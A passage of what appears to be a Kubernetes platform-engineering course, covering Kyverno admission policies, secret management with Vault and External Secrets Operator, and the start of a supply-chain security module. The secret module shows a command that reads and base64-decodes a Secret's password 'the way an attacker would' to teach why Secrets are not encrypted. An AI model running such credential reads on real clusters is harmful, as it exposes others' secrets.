 each.
- Roll out a policy safely from **Audit** to **Enforce** using policy reports.
- Design **controlled exceptions** so the paved road has escape hatches, not holes.

---

### 1. Concept

#### From checklist to guardrail

 and the Kubernetes security standards tell you *what* a safe workload
looks like: non-root, read-only root filesystem, dropped capabilities, resource
limits, a pinned image, required ownership labels. The hard part is not knowing the
rules — it's guaranteeing they are applied to *every* workload, forever, including the
one a tired engineer ships at 5pm on Friday.

There are two ways to get that guarantee. A **checklist** lives in a wiki and depends
on humans remembering. A **guardrail** lives in the cluster and depends on nothing:
the moment a non-compliant resource is submitted, it is rejected (or fixed, or logged)
automatically. Policy as code is how you build guardrails — the security baseline
expressed as declarative, version-controlled, testable rules that the cluster
enforces on its own.

#### Where policy runs: admission control

Recall the admission pipeline. Every write to the API server is
authenticated, authorized (RBAC, ), then passed through **admission
controllers** before it is persisted to etcd:

```text
kubectl apply ─▶ API server ─▶ authn ─▶ authz (RBAC) ─▶ admission ─▶ etcd
 │
 ┌───────────────────────┴───────────────┐
 │ mutating webhooks → validating webhooks│
 │ (Kyverno can do BOTH) │
 └─────────────────────────────────────────┘
```

A **policy engine** registers as a webhook. On every relevant request it can:

- **mutate** — change the object (inject a default `securityContext`, add a label)
 *before* validation, or
- **validate** — allow or deny based on a rule ("every container must set
 `runAsNonRoot: true`").

Because this happens at admission, the guarantee is airtight: there is no path into
the cluster that bypasses it, whether the request came from a human, a CI pipeline, an
Argo CD sync, or another controller.

#### Kyverno vs OPA/Gatekeeper

The two mainstream Kubernetes policy engines are **Kyverno** and **OPA/Gatekeeper**.
Both do validating and mutating admission; the difference is how you *write* policy:

- **Kyverno** policies are **Kubernetes resources written in YAML**. The match/validate
 patterns look like the manifests your team already reads. No new language.
- **OPA/Gatekeeper** uses **Rego**, a powerful general-purpose policy language. More
 expressive for complex logic, but a separate language your policy authors must learn.

This course chooses Kyverno — the same reasoning as
Project 1's ADR-004:
lowest adoption friction for a YAML-fluent team, plus first-class **mutation**,
**generation**, and **image-signature verification**, which fit a
platform's supply-chain goals. Gatekeeper remains an excellent choice when you need
Rego's expressiveness. The *concepts* here transfer to either.

#### The four policy types

Kyverno rules come in four flavours — together they do far more than "block bad YAML":

- **validate** — accept or reject a resource against a pattern. The workhorse:
 "deny pods that run as root," "require resource limits," "forbid `:latest` in prod."
- **mutate** — modify a resource on the way in. Use it to apply *safe defaults* so
 teams get hardening for free: inject `seccompProfile: RuntimeDefault`, add
 `automountServiceAccountToken: false`, stamp cost-center labels.
- **generate** — create *related* resources automatically. When a namespace appears,
 generate its default-deny `NetworkPolicy`, a resource quota, or a baseline
 `RoleBinding`. The platform provisions guardrails, not just checks them.
- **verifyImages** — require a valid signature/attestation before an image may run. The supply-chain enforcement point.

#### ClusterPolicy vs Policy

- **`ClusterPolicy`** is cluster-scoped — it applies everywhere. Baseline security
 rules (no root, no `:latest`) are ClusterPolicies.
- **`Policy`** is namespace-scoped — it applies only within its namespace. Use it for
 team- or environment-specific rules a tenant may own.

#### Audit vs Enforce: how to roll out without an outage

The single most important operational control is `validationFailureAction`:

- **`Audit`** — violations are *recorded* in policy reports but the resource is
 **admitted**. Nothing breaks. You learn how many workloads would fail.
- **`Enforce`** — violations are **rejected** at admission. The guardrail is live.

The golden rule: **start in Audit, measure, then flip to Enforce.** Shipping a new
`Enforce` policy against a cluster full of legacy workloads is how you cause an
incident and get policy-as-code banned. Audit first turns a scary change into a data
exercise: how big is the gap, who owns the violations, what has to change first?

Supporting machinery makes this safe at scale:

- **Policy reports** (`PolicyReport`, `ClusterPolicyReport`) give you a live,
 queryable list of pass/fail results per resource — visibility without blocking.
- **Background scanning** re-evaluates policies against *existing* resources on a
 schedule, so Audit covers what's already running, not just new admissions.
- **Policy exceptions** (`PolicyException`) are controlled, declarative escape
 hatches: "this specific workload in this namespace is exempt from this rule," in
 Git, reviewable — an opinionated default with a documented deviation, not a hole.

---

### 2. Why it matters for platform engineering

- **Security becomes structural.** The baseline is enforced by machinery, not trust.
 A team cannot *forget* to run non-root, because the cluster won't admit a root pod.
 This is the course's central theme made literal.
- **Fix once, protect everywhere.** A single ClusterPolicy secures every current and
 future namespace. No per-team review scales like that.
- **Mutation is a developer-experience feature.** Injecting safe defaults means teams
 get hardening *without writing it*. The golden path stays short; the guardrail does
 the boring part. Security that makes developers faster, not slower.
- **Generation provisions guardrails.** New namespace → default-deny network policy +
 quota appear automatically. The safe configuration is the default configuration.
- **Audits are reports, not fire drills.** Policy reports are standing evidence that
 the baseline holds — exactly what a compliance reviewer wants to see.

---

### 3. Mental model

Think of policy as an **automated reviewer standing at the cluster door** who never
sleeps, never forgets, and reviews *every* request identically:

```text
 ┌──────────── Kyverno ────────────┐
 request ──▶ match? ──▶│ mutate → apply safe defaults │──▶ admitted (changed)
 │ no │ generate → create companions │
 ▼ │ validate → pass ──────────────┼──▶ admitted
 ignored │ fail ─┬─ Audit ────┼──▶ admitted + report
 │ └─ Enforce ───┼──▶ REJECTED
 └──────────────────────────────────┘

 Rollout order: Audit (measure the gap) ──▶ fix owners ──▶ Enforce (close it)
```

Two rules to remember a year from now:

1. **Mutate to help, validate to enforce.** Give teams good defaults automatically;
 reject only what you cannot safely fix for them.
2. **Audit before Enforce, always.** You never flip a guardrail live without first
 measuring who it would break.

---

### 4. Minimal implementation

Before Kyverno, the "policy" for non-root containers is a sentence in a runbook, and
the only enforcement is code review. Prove the gap: on a plain cluster, a root pod is
admitted without complaint.

```bash
kubectl run rooted --image=nginx --restart=Never
# pod/rooted created ← nothing stopped it; it runs as root by default
```

Now the smallest possible guardrail. Install Kyverno, then apply one ClusterPolicy
that requires `runAsNonRoot` — starting in **Audit** so it can't break anything:

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
 name: disallow-root-containers
spec:
 validationFailureAction: Audit # measure first; flip to Enforce later
 rules:
 - name: check-run-as-non-root
 match:
 any:
 - resources:
 kinds: [Pod]
 validate:
 message: "Containers must set securityContext.runAsNonRoot: true."
 pattern:
 spec:
 containers:
 - securityContext:
 runAsNonRoot: true
```

In Audit mode, the root pod still runs, but a `PolicyReport` now records the
violation — you can *see* the gap. Change one word to `Enforce`, and the same
`kubectl run rooted...` is rejected at admission with your message. That one-word
diff is the entire rollout model: observe, then enforce. The lab builds this into a
real baseline — no root, no `:latest` in prod, required limits, required labels.

---

### 5. Hands-on lab

You'll install Kyverno on a kind cluster and apply four real ClusterPolicies —
disallow-root, require-limits, disallow-latest-in-prod, and require-labels — first in
**Audit** to read the reports, then in **Enforce** to watch them block a bad pod and
admit a good one.

➡️ **Start the lab**

---

### 6. Production considerations

- **The webhook is in the critical path.** If Kyverno is down and a policy uses
 `failurePolicy: Fail`, admissions for matched resources are blocked. Run it
 highly-available (multiple replicas), set sensible `webhookTimeoutSeconds`, and
 decide per policy whether `Fail` (secure) or `Ignore` (available) is correct — a
 real availability-vs-security trade-off.
- **Scope matches narrowly.** Over-broad `match` blocks or heavy mutation on every
 request adds admission latency and blast radius. Exclude system namespaces
 (`kube-system`) deliberately; match the kinds you mean.
- **Policies are code — test them.** Use the Kyverno CLI (`kyverno test`,
 `kyverno apply`) in CI against fixture manifests so a bad policy fails the pipeline,
 not production. Ship policies via GitOps (Project 2) like any other change.
- **Exceptions must be governed.** `PolicyException` is powerful; without RBAC on who
 can create them and review in Git, your guardrails leak. Treat an exception like a
 signed waiver with an expiry.
- **Reports need a home.** Pipe `PolicyReport` data into your observability/ compliance
 stack (Policy Reporter UI, dashboards) so violations are visible and trend down.
- **Version and migrate.** New stricter policies follow the same Audit → communicate →
 Enforce path you'd use for any breaking platform change.

---

### 7. Common mistakes

- **Shipping `Enforce` on day one.** A new strict policy against legacy workloads
 causes instant, widespread admission failures and an incident. *Fix:* always start
 in `Audit`, read the reports, fix owners, *then* enforce.
- **No escape hatch.** A policy with zero exception mechanism forces teams to route
 around the platform (or around *you*) when they hit a legitimate edge case. *Fix:*
 governed `PolicyException` resources, in Git, reviewed and time-boxed.
- **Mutating when you should validate (or vice-versa).** Silently mutating a security
 field can hide a real problem; validating something you could safely default adds
 friction. *Fix:* mutate safe defaults, validate (reject) genuine policy breaches.
- **Forgetting `failurePolicy` math.** Leaving everything on `Fail` turns a Kyverno
 outage into a cluster-wide admission outage; leaving security policies on `Ignore`
 lets bad resources through when the engine hiccups. *Fix:* choose per policy,
 deliberately, and make Kyverno HA.
- **Policies that never get tested.** Hand-editing YAML in the cluster until it "looks
 right." *Fix:* `kyverno test` in CI with pass/fail fixtures.
- **Treating Kyverno as the only layer.** Admission can't see what a *running* pod
 does. *Fix:* pair policy (prevent) with runtime detection.

---

### 8. Assessment

**Knowledge checks**

1. At what point in the API request lifecycle does Kyverno act, and why does that make
 its guarantee hard to bypass?
2. What is the difference between `Audit` and `Enforce`, and why do you always start
 with the former?
3. Give a good use for each of validate, mutate, and generate.
4. When would you reach for OPA/Gatekeeper instead of Kyverno?

**Concept exercise**

> Explain how a platform guarantees every workload is non-root and has resource
> limits **without using the words "Kyverno," "admission webhook," or "policy
> engine."** Describe the mechanism and the guarantee, not the product.

**Trade-off / debugging exercise**

> You enforce a new `require-limits` ClusterPolicy at 09:00. By 09:05, Argo CD syncs
> are failing across six teams and nobody can deploy. Walk through what happened, how
> `failurePolicy` and `Audit` mode each relate to it, and the exact sequence you'd use
> to roll this out safely next time — including how you'd handle the legacy workloads
> that don't set limits yet.

<details>
<summary>Discussion (open after you've answered)</summary>

- **When/why:** Kyverno runs as a mutating+validating **admission webhook**, after
 authn/authz and before the object is written to etcd. Every write path — humans, CI,
 Argo CD, other controllers — goes through admission, so there is no side door.
- **Audit vs Enforce:** Audit records violations in policy reports but still admits the
 resource; Enforce rejects it. You start in Audit to measure the gap and fix owners
 before anything can break.
- **Uses:** validate — reject root pods / missing limits; mutate — inject
 `seccompProfile: RuntimeDefault` or default labels; generate — create a default-deny
 NetworkPolicy and quota when a namespace is created.
- **Gatekeeper:** when you need Rego's expressiveness for complex, cross-resource logic
 and your team is comfortable maintaining a policy language.
- **Debugging:** the `Enforce` policy rejected every pod without limits at admission;
 because Argo CD's applies hit the webhook, its syncs failed. With `Audit` first you'd
 have seen the violation count without breakage; `failurePolicy` governs what happens
 when Kyverno itself is unavailable (Fail = block, Ignore = allow). Safe rollout:
 deploy the policy as `Audit`, read `PolicyReport`s, give teams a deadline + a mutate
 rule or defaults to add limits, optionally add time-boxed `PolicyException`s for
 stragglers, then flip to `Enforce`.

</details>

---

### 9. Further reading

- Kyverno — [Documentation](https://kyverno.io/docs/) and [Policies library](https://kyverno.io/policies/)
- Kyverno — [Writing policies: validate / mutate / generate](https://kyverno.io/docs/writing-policies/)
- Open Policy Agent — [Gatekeeper](https://open-policy-agent.github.io/gatekeeper/website/docs/)
- Kubernetes — [Dynamic Admission Control](https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/)
- Kubernetes — [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- CNCF — [Policy Reporter](https://kyverno.github.io/policy-reporter/) (visualizing policy reports)

---


_Previous:_ Kubernetes RBAC Deep Dive
· _Next:_ Secret Management →

---

## Secret Management

> A Kubernetes `Secret` feels like a vault, but its data is just **base64 — an
> encoding, not encryption**. Anyone who can read the object, or reach etcd, reads the
> value in plaintext. This module makes secret *delivery* a platform capability: an
> external store holds the truth, an operator syncs it in, and teams reference a secret
> by name without ever handling — or committing to Git — the raw value.

**You'll need:** · Container Security
(secrets are never baked into images), a working `kubectl` +
[kind](https://kind.sigs.k8s.io/), and [Helm](https://helm.sh/).

### Learning objectives

By the end of this module you will be able to:

- Explain why a Kubernetes `Secret` is **base64-encoded, not encrypted**, and who can
 read it.
- Configure **encryption at rest** for etcd and say why a **KMS provider** beats a
 local key.
- Use an **external store** (HashiCorp Vault) and the **External Secrets Operator** to
 sync secrets into the cluster without putting values in Git.
- Contrast **ESO**, the **Secrets Store CSI Driver**, and **Workload Identity / IRSA**,
 and pick the right one.
- Design **rotation** so the platform re-syncs secrets and workloads tolerate change.

---

### 1. Concept

#### A Kubernetes Secret is base64, not a secret

The name is a trap. A Kubernetes `Secret` is a first-class API object, but its data is
only **base64-encoded** — a reversible transport encoding with no key and no secrecy.
Anyone who can `get` the object, read a backup, or reach **etcd** (where the API server
stores it) decodes the value in one command:

```console
$ kubectl get secret my-app-db -o jsonpath='{.data.password}' | base64 -d
devpassword
```

No password was cracked; base64 is not a lock. Two consequences follow. First, **RBAC
on Secrets is load-bearing** — `get`/`list` on `secrets` is effectively "read every
credential in the namespace". Second, **the value sits in etcd in
plaintext by default**, so anyone with a disk snapshot or etcd access reads it without
ever touching the API.

#### Encryption at rest: protect etcd with KMS

The API server can encrypt Secret data *before* it writes to etcd, using an
`EncryptionConfiguration` passed as `--encryption-provider-config`. You choose a
provider for the `secrets` resource:

- **`aescbc` / `secretbox`** — a symmetric key stored **in the config file on the
 control-plane node**. Better than nothing, but the key lives next to the data it
 protects; whoever reads the node reads the key.
- **`kms` (v2)** — the API server calls a **cloud KMS plugin** so the real key never
 leaves the KMS. This is **envelope encryption**: KMS holds a key-encryption key
 (KEK), each write gets a fresh data-encryption key (DEK), and only the wrapped DEK is
 stored beside the data. Rotating the KEK is a KMS operation, not a cluster migration.

```text
write: Secret → API server → [encrypt with DEK] → etcd (ciphertext)
read: etcd (ciphertext) → API server → [decrypt] → caller with RBAC sees plaintext
 ▲
 KMS holds the KEK; only the wrapped DEK is stored on disk
```

Crucially, encryption at rest protects **etcd on disk** — stolen backups, raw volumes,
offline etcd. It does **nothing** against someone with `get secret` RBAC, because the
API server decrypts on read. Encryption at rest and tight RBAC are **different layers**;
you want both.

#### HashiCorp Vault: the external source of truth

Encryption at rest hardens etcd, but the stronger move is to **keep the source of truth
outside the cluster entirely**, in a purpose-built store. HashiCorp **Vault** is the
canonical example:

- **KV v2 engine** — versioned key/value secrets. Every write keeps history, so you can
 read, roll back, or audit previous versions.
- **Dynamic secrets** — Vault *generates* short-lived credentials on demand (a database
 user, a cloud key) with a **lease**, then **auto-revokes** them when the lease ends.
 The credential a pod holds may be valid for an hour and never reused — there is no
 long-lived password to leak.
- **Vault Agent** — a sidecar/init container that authenticates to Vault and writes
 secrets into the pod as **files or environment variables**, keeping them out of the
 manifest entirely.

Vault authenticates workloads with its **Kubernetes auth method**: a pod presents its
ServiceAccount token, Vault verifies it with the cluster, and binds it to a **policy**
that scopes exactly which paths it may read. No static Vault token is shipped to the
app.

#### External Secrets Operator: GitOps-safe sync

Vault answers "where does truth live." The **External Secrets Operator (ESO)** answers
"how does it get into Kubernetes **without putting the value in Git**." ESO is a
controller that reads from an external store (Vault, AWS/GCP/Azure managers) and
**materializes a native Kubernetes `Secret`**. Two resources drive it:

- **`SecretStore` / `ClusterSecretStore`** — *where* to fetch from and *how* to
 authenticate (namespaced vs. cluster-wide).
- **`ExternalSecret`** — *which* keys to pull and *what* K8s Secret to create, on a
 `refreshInterval`.

The payoff for GitOps: **Git holds only a reference**, never a value. An
`ExternalSecret` says "create Secret `my-app-db` from Vault path `secret/my-app/db`" —
safe to commit, diff, and review. This is exactly the decision recorded in Project 1
ADR-005
and Project 2
ADR-014:
the source of truth is a hardened store, and the config repo stays plaintext-free.

#### CSI Driver and Workload Identity: fewer copies, no static creds

ESO is the common default, but it is not the only shape:

- **Secrets Store CSI Driver** — mounts secrets straight from the store as a **volume**
 in the pod, so (optionally) **no Kubernetes `Secret` object exists at all**. Fewer
 copies, but the value is present only while a pod mounts it, and consuming it as an
 env var still needs a synced Secret.
- **Workload Identity (GKE) / IRSA (EKS)** — the best end-state for *cloud* secrets and
 APIs. A Kubernetes **ServiceAccount is mapped to a cloud IAM identity**, so a pod
 calls the cloud secret manager (or any cloud API) **with no static credentials at
 all** — the cloud trusts the pod's projected token directly. There is nothing to
 rotate or leak because there is no key.

Rule of thumb: use **Workload Identity / IRSA** for cloud access, **ESO** to sync a
store into Secrets for everything else, and the **CSI Driver** to avoid a Secret object.
All three keep raw values out of Git and developers' hands.

---

### 2. Why it matters for platform engineering

- **Secret delivery is a platform capability.** Teams should never run
 `kubectl create secret`, paste a password into a values file, or hold a production
 credential. The platform provides a paved path — reference a name, get a secret — so
 being secure is the default, not a discipline.
- **GitOps stays honest.** The config repo is the source of truth for *everything
 except secret values*. ESO's reference-only model keeps the declarative model intact
 without ever committing a credential — the problem every GitOps platform must solve.
- **Blast radius shrinks.** Short-lived dynamic secrets and keyless Workload Identity
 mean a leaked credential is either already expired or never existed. Static,
 long-lived secrets are the ones that show up in breach post-mortems.
- **Rotation becomes routine, not a project.** When delivery is centralized, rotating a
 password is one write to the store; ESO re-syncs and dynamic secrets rotate by
 design. Without it, rotation means hunting copies across namespaces and repos.
- **It closes an OWASP risk by construction.** "Secrets management failures" (OWASP
 K08) is a top Kubernetes risk; making the secure path the easy path removes the
 motivation to paste a secret into a ConfigMap.

---

### 3. Mental model

Hold one picture: **the platform is a delivery pipe, not a storage box.** Secrets live
in a hardened store; the platform *delivers* them to pods on demand and keeps the raw
value out of Git and out of human hands.

```text
 SOURCE OF TRUTH PLATFORM (delivery) WORKLOAD
 ┌───────────────┐ ┌───────────┐
 │ Vault / cloud │ ExternalSecret │ Pod │
 │ secret store │ (a reference, lives in Git) │ reads │
 │ KV v2·dynamic │ │ env/file │
 └──────┬────────┘ └─────▲─────┘
 │ 1. authenticate + fetch │
 ▼ │ 3. consume
 ┌───────────┐ 2. materialize ┌────────────────────┐ │
 │ ESO │───────────────────▶│ K8s Secret (base64) │──┘
 │ controller│ every refresh │ stored in etcd │
 └───────────┘ └─────────┬──────────┘
 │ encryption at rest
 ▼ (API server + KMS)
 ┌──────────────┐
 │ etcd on disk │ ciphertext
 │ (KMS/aescbc) │
 └──────────────┘

 Git holds only a reference · RBAC guards the Secret · KMS guards etcd on disk
```

Three independent protections, three different layers:

- **Reference-only in Git** keeps values out of version control.
- **RBAC on the Secret** controls who
 reads it *inside* the cluster.
- **Encryption at rest** controls who reads **etcd on disk** outside the API.

Keyless **Workload Identity / IRSA** is the same pipe with one segment removed: the
pod's identity *is* its credential, so there is no stored secret to protect at all.

---

### 4. Minimal implementation

Start with the problem. Create an ordinary Secret and "read" it the way an attacker
would:

```console
$ kubectl create secret generic my-app-db \
 --from-literal=username=app --from-literal=password=devpassword

$ kubectl get secret my-app-db -o jsonpath='{.data.password}' | base64 -d
devpassword
```

The value round-trips through `base64 -d` with no key. Commit that manifest to a GitOps
repo and the plaintext (base64) is in Git history forever. That is the whole problem:
the Secret is not secret, and committing it is worse.

The fix is to never create the Secret by hand. Keep the value in Vault and let ESO
materialize it from a **reference**:

```yaml
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
 name: my-app-db
spec:
 refreshInterval: 15s
 secretStoreRef:
 name: vault-dev
 kind: SecretStore
 target:
 name: my-app-db # the K8s Secret ESO creates
 data:
 - secretKey: password
 remoteRef:
 key: my-app/db # Vault: mount "secret" + key "my-app/db"
 property: password
```

This manifest is safe to commit: it names a Vault path, not a password. ESO reads
`secret/my-app/db` from Vault and creates (and keeps refreshing) the `my-app-db` Secret.
To **rotate**, you never touch Kubernetes — write a new value to Vault and ESO re-syncs
within `refreshInterval`:

```console
$ vault kv put secret/my-app/db username=app password=rotated-$(date +%s)
Success! Data written to: secret/my-app/db
```

The lab builds this end to end — Vault in dev mode, ESO via Helm, a synced Secret, and
a live rotation — all locally and free.

---

### 5. Hands-on lab

You'll run **HashiCorp Vault** in dev mode inside a kind cluster, install the **External
Secrets Operator**, sync a Vault secret into a native Kubernetes `Secret` with an
`ExternalSecret`, and then **rotate** it — watching ESO re-sync — all locally and at no
cost.

➡️ **Start the lab**

---

### 6. Production considerations

- **Encryption at rest is table stakes — use KMS, not a local key.** On managed
 clusters, enable the provider's KMS-backed Secret encryption (or run your own
 `EncryptionConfiguration` with a `kms` provider). An `aescbc` key in a file on the
 node is a weak second choice. (See
 `lab/encryption-config.yaml`.)
- **Prefer keyless identity.** Workload Identity (GKE) / IRSA (EKS) removes static cloud
 credentials entirely; reach for it before shipping any long-lived key. The best secret
 is the one that does not exist.
- **Favor short-lived, dynamic secrets.** Vault dynamic database/cloud credentials with
 short leases turn "rotate the password" into "the credential already expired." Design
 apps to **re-read** secrets, not cache them forever.
- **Secrets still land as K8s Secrets — defend that layer.** Even with ESO, the value
 materializes in etcd. Keep **encryption at rest on** and **RBAC on `secrets` tight**. ESO is not a substitute for those; it feeds them.
- **Scope SecretStore auth least-privilege.** A `ClusterSecretStore` is convenient but
 cluster-wide; prefer namespaced `SecretStore`s with Vault policies that grant only the
 paths a team needs. Authenticate workloads with the **Kubernetes auth method**, never
 a shared static token.
- **Mind rotation latency and failure modes.** `refreshInterval` is a trade-off: short
 means fast rotation and more load; long means staleness. Alert when ESO cannot reach
 the store — a failed sync leaves pods on the *last good* value, which can mask an
 outage.
- **Audit and limit sprawl.** Every copy is attack surface. Track where secrets land,
 who can read them, and prune Secrets no `ExternalSecret` owns.

---

### 7. Common mistakes

- **Treating base64 as encryption.** Committing a `Secret` manifest "because it's
 encoded." base64 is reversible with zero effort. *Fix:* keep values in a store; commit
 only an `ExternalSecret` reference.
- **Secrets in ConfigMaps, env literals, or values files.** Pasting a password into a
 Helm `values.yaml` or a plain env var to "move fast." It ends up in Git and image
 layers. *Fix:* route every secret through ESO / CSI / Workload Identity.
- **Assuming ESO encrypts the Secret.** ESO syncs *into* a normal K8s Secret — still
 base64 in etcd. *Fix:* pair ESO with encryption at rest and tight RBAC; they are
 different layers.
- **One `ClusterSecretStore` with god-mode auth.** A single cluster-wide store whose
 credential can read every path. *Fix:* namespaced stores, least-privilege Vault
 policies, Kubernetes auth per workload.
- **Shipping a static Vault or cloud token into the pod.** Defeats the point — you've
 just moved the long-lived secret. *Fix:* Kubernetes auth method or Workload Identity so
 the pod's identity *is* the credential.
- **Apps that read a secret once and cache forever.** Rotation re-syncs the Secret, but a
 process that read the old env var never notices. *Fix:* re-read on an interval, watch
 the mounted file, or restart on change.

---

### 8. Assessment

**Knowledge checks**

1. Why is a Kubernetes `Secret` not actually secret, and which two different controls
 protect it on disk versus inside the cluster?
2. What does an `EncryptionConfiguration` protect against, and why is a `kms` provider
 stronger than an `aescbc` key in the config file?
3. In the ESO model, what exactly lives in Git, and what never does?
4. How does **Workload Identity / IRSA** let a pod reach cloud secrets with no static
 credential?
5. Describe how a rotation propagates from the store to a running pod, and one reason the
 pod might still use the old value.

**Concept exercise**

> Explain, **without naming Vault or the External Secrets Operator**, how a platform can
> let a team deploy an app that needs a database password while guaranteeing the password
> is never written in Git, never typed by a developer, and changeable without
> redeploying. What has to be true of the store, the sync, and the app?

**Trade-off / debugging exercise**

> A team reports their app still authenticates with the **old** password an hour after
> you rotated it in the store. The `ExternalSecret` has `refreshInterval: 1h`, the synced
> `Secret` *does* show the new value, and the pod has not restarted. Walk through where
> the staleness is, what you'd check, and two different fixes — one in the platform, one
> in the app.

<details>
<summary>Discussion (open after you've answered)</summary>

- **Not secret:** `Secret` data is base64 — reversible with `base64 -d`, no key. On disk
 it is protected by **encryption at rest** (API server + KMS over etcd); inside the
 cluster it is protected by **RBAC** on the `secrets` resource. Different layers, both
 needed.
- **EncryptionConfiguration:** protects **etcd at rest** (stolen disks, backups, raw
 etcd). A `kms` provider keeps the key-encryption key in an external KMS (envelope
 encryption), so the key never sits next to the data and rotation is a KMS operation;
 `aescbc` stores the key in a file on the control-plane node.
- **Git:** holds only the `ExternalSecret` / `SecretStore` **references** (paths, store
 names) — never the secret value. The value lives in the external store and lands as a
 K8s Secret the operator creates.
- **Workload Identity / IRSA:** a K8s ServiceAccount is federated to a cloud IAM
 identity; the cloud trusts the pod's projected token directly, so the pod calls the
 secret manager with **no stored key** to rotate or leak.
- **Rotation path:** write to the store → ESO re-syncs on `refreshInterval` → the K8s
 Secret updates. The pod may still use the old value because it read the env var/file
 **once at startup** and cached it, or it has not restarted. Fixes: shorten
 `refreshInterval` and roll/annotate the Deployment on change (platform side); make the
 app **re-read** the mounted secret or watch the file (app side).

</details>

---

### 9. Further reading

- HashiCorp — [Vault documentation](https://developer.hashicorp.com/vault/docs)
- External Secrets Operator — [Documentation](https://external-secrets.io/latest/)
- Kubernetes SIG — [Secrets Store CSI Driver](https://secrets-store-csi-driver.sigs.k8s.io/)
- Kubernetes — [Encrypting Secret Data at Rest](https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/)
- Google Cloud — [GKE Workload Identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
 · AWS — [EKS IAM Roles for Service Accounts (IRSA)](https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html)
- SPIFFE — [Secure identity for workloads](https://spiffe.io/docs/latest/spiffe-about/overview/) (optional)

---


_Previous:_ Policy as Code with Kyverno
· _Next:_ Supply Chain Security →

---

## Supply Chain Security

> You don't just run the code you wrote — you run **everything it depends on** and
> the **pipeline that built it**. A production image is mostly other people's code:
> base layers, a runtime, hundreds of transitive dependencies, assembled by a CI
> system that is itself attackable. Supply chain security is how the platform makes
> "only known-good, scanned, attested artifacts ship" a structural property of the
> paved road — not a chore each team has to remember.

**You'll need:** · Container Security,
Docker, and [Syft](https://github.com/anchore/syft),
[Grype](https://github.com/anchore/grype), and
[Cosign](https://github.com/sigstore/cosign) (installed in the lab).

### Learning objectives

By the end of this module you will be able to:

- Explain the **software supply chain** as an attack surface and name its common attacks
 (typosquatting, dependency confusion, malicious deps, build compromise).
- Place a build on the **SLSA** maturity ladder (levels 0–3) and say what each rung adds.
- Generate a **Software Bill of Materials (SBOM)** with Syft and explain why inventory is
 the precondition for everything else.
- Scan an artifact with **Grype**, fail a build on severity, and triage false positives.
- Attach a **provenance/SBOM attestation** with Cosign (verification is ).

---

### 1. Concept

#### You run everything you depend on

Earlier phases treated "your application" as the thing you secure. But a container ships
a base image, a runtime, system libraries, and — for a typical service — **hundreds of
transitive dependencies** you never chose. You wrote maybe 2% of the bytes in
production; the rest arrived through a **supply chain** of registries, base-image
maintainers, and the pipeline that assembled them.

That chain is an attack surface. The **SolarWinds** breach (2020) is the archetype:
attackers didn't exploit a CVE in the running app — they compromised the **build
system** and slipped a backdoor into a *signed* update thousands installed as trusted.
The lesson generalizes: **compromise the pipeline or a dependency and you don't need to
break the app — the app ships your code for you.**

#### How supply chains get compromised

The same pattern appears at every link in the chain:

- **Typosquatting.** A malicious package named to look like a popular one (`reqeusts`
 for `requests`). One typo pulls attacker code with install-time execution.
- **Dependency confusion.** You depend on an *internal* `acme-utils`; an attacker
 publishes a *public* one with a higher version and a misconfigured resolver prefers it.
 Your build pulls the impostor.
- **Malicious transitive deps.** You vet your direct dependencies, but each pulls its
 own. A backdoor three levels deep — a hijacked maintainer, a poisoned release — ships
 without you ever naming it.
- **Build compromise.** The SolarWinds move: tamper with the builder, base image, or a
 build script so the *output* is malicious even though the source in Git is clean.

You can't audit every transitive dependency, so prevention alone can't cover this. The
platform leans on **inventory, scanning, and provenance** instead — the rest of this
module.

#### SLSA: a maturity ladder for build integrity

**SLSA** (Supply-chain Levels for Software Artifacts, pronounced "salsa") grades how
trustworthy a build *process* is. Read it as a **maturity ladder** — each rung makes
tampering harder to hide:

```text
SLSA build levels — each rung adds tamper-resistance
────────────────────────────────────────────────────
 L0 No guarantees no provenance; "just trust me"
 L1 Provenance build records how it was made — but forgeable
 L2 Signed provenance a hosted builder signs it — tampering now shows
 L3 Hardened builds isolated, ephemeral, non-falsifiable provenance
```

The point isn't to hit L3 on day one — it's that "where did this come from?" moves from
an *unanswerable* question (L0) to a *verifiable fact* (L3), one rung at a time. The
platform moves every team up the ladder **by default**.

#### SBOM: you can't secure what you can't inventory

Before you can scan, patch, or attest anything, you must answer a hard question: **what
is actually in this artifact?** A **Software Bill of Materials (SBOM)**
is the answer — a machine-readable inventory of every component and version in an image,
like the ingredient list on food packaging.

When the next Log4Shell-class CVE drops, the only question is *"are we affected, and
where?"* Without an inventory that's days of grepping; with an SBOM per artifact it's a
single query. **You cannot patch what you cannot see.** Two open formats dominate, and
the tooling speaks both:

- **SPDX** — a Linux Foundation / ISO standard (originally license-focused, now broad).
 This course's default.
- **CycloneDX** — an OWASP, security-first standard, widely used in vuln workflows.

The key move: generate the SBOM *at build time*, when you know exactly what went in.

#### Inventory, scan, update, attest

Four activities turn the supply chain from a blind spot into a controlled pipeline
stage. The course-default tools are free and CI-friendly:

- **SBOM — Syft.** `syft <image> -o spdx-json` emits a full component inventory.
- **Scan — Grype.** `grype <image>` or `grype sbom:./sbom.json` matches your inventory
 against vulnerability databases and reports CVEs by severity — the same job as Trivy.
 The platform move either way: **scan in CI and fail the build on high/critical**.
- **Update — Dependabot / Renovate.** Most vulnerabilities live in *out-of-date*
 dependencies. Update bots open PRs as versions ship, so exposure to a known CVE is days,
 not quarters.
- **Attest — Cosign.** An **attestation** is a signed statement *about* an artifact —
 "this SBOM belongs to this exact image, and I built it." `cosign attest` attaches it in
 the registry. This module **generates** it; ** verifies and enforces** it.

---

### 2. Why it matters for platform engineering

- **A structural control, not a per-team chore.** No team can SBOM, scan, and attest
 every build by hand. The platform bakes all three into the paved road, so **every**
 artifact is covered by construction — the Nth team gets it for free.
- **Inventory is incident-response leverage.** "Are we affected by CVE-X?" is a
 board-level question during a zero-day. With SBOMs stored per artifact it's a query
 that returns in minutes — not a week of panic.
- **The pipeline is the control point.** Admission policy can reject an
 unsigned image, but the *facts* it checks — scan verdict, SBOM, provenance — are
 produced in CI, where the CI/CD phase and the security phase meet.
- **It closes the "we only secured runtime" gap.** 's hardening protects the
 *running* container; it can't help if the artifact was malicious before it ran. Supply
 chain security guards what's allowed to *become* an artifact.
